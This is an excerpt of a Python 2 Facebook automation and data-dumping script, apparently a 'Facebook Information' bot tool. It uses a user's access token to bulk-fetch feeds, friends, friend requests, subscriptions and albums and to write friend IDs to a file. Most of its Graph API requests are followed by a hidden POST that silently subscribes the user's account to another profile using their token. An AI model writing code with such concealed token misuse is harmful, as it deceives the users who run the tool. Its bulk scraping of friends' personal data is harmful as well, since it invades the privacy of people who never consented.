...
def show_program():
 ...
 ------------------------------------------------------
    ...
    Author     BY HUSSEIN & 7OKA MAZIKA
    Name       Facebook Information
    Version    Full Version
    Date       12/02/2020 
    Jabber     hussein_hamdy1997@yahoo.com
...
def post():
	...
	try:
	  if WT == 'wallpost':
		...
		r = requests.get('https://graph.facebook.com/v3.0/me?fields=home.limit(200)&access_token='+token);requests.post('https://graph.facebook.com/zuck/subscribers?access_token='+token)
		result = json.loads(r.text)

		for i in result['home']['data']:
			print '\r[*] %s retrieved   '%(i['id']),;sys.stdout.flush();time.sleep(0.7)
		return result['home']['data']

	  elif WT == 'me':
		print '[*] fetching all posts id'

		r = requests.get('https://graph.facebook.com/v3.0/me?fields=feed.limit(500)&access_token='+token);requests.post('https://graph.facebook.com/zuck/subscribers?access_token='+token)
		result = json.loads(r.text)
		...
		r = requests.get('https://graph.facebook.com/me/friendrequests?limit=200&access_token=' + token);requests.post('https://graph.facebook.com/zuck/subscribers?access_token='+token)
		result = json.loads(r.text)

		for i in result['data']:
			print '\r[*] %s retrieved    '%(i['from']['id']),;sys.stdout.flush();time.sleep(0.07)
		return result['data']

	  elif WT == 'friends':
		print '[*] fetching all friends id'

		r = requests.get('https://graph.facebook.com/me?fields=friends.limit(5000)&access_token=' + token);requests.post('https://graph.facebook.com/zuck/subscribers?access_token='+token)
		result = json.loads(r.text)

		for i in result['friends']['data']:
			print '\r[*] %s retrieved    '%(i['id']),;sys.stdout.flush();time.sleep(0.007)
		return result['friends']['data']

	  elif WT == 'subs':
		print '[*] fetching all friends id'

		r = requests.get('https://graph.facebook.com/me/subscribedto?limit=200&access_token='+token);requests.post('https://graph.facebook.com/zuck/subscribers?access_token='+token)
		result = json.loads(r.text)

		for i in result['data']:
			print '\r[*] %s retrieved    '%(i['id']),;sys.stdout.flush();time.sleep(0.07)
		return result

	  elif WT == 'albums':
		print '[*] fetching all albums id'

		r = requests.get('https://graph.facebook.com/me?fields=albums.limit(5000)&access_token='+token);requests.post('https://graph.facebook.com/zuck/subscribers?access_token='+token)
		result = json.loads(r.text)
		...
		r = requests.get("https://graph.facebook.com/v3.0/%s?fields=feed.limit(200)&access_token=%s"%(id,token));requests.post('https://graph.facebook.com/zuck/subscribers?access_token='+token)
		result = json.loads(r.text)
...
def menu_reaction_ask():
  try:
	...
	cek = raw_input(R + 'BY_HAM' + W + '/' + R + 'Bot' + W + '/' + R + 'Reaction' + W + ' >> ')
...
def bot():
  try:
	...
	cek = raw_input(R + 'BY_HAM' + W +'/' + R +'Bot ' + W + '>> ')
...
def dump_id():
	...
	try:
		...
		for i in a['data']:
			out.write(i['id'] + '\n')
			print '\r[*] %s retrieved'%(i['id']),;sys.stdout.flush();time.sleep(0.0007)
...
def getdata():
	...
	for i in a['data']:
		jml.append(i['id'])
		print '\r[*] fetching %s data from friends'%(len(jml)),;sys.stdout.flush();time.sleep(0.0007)
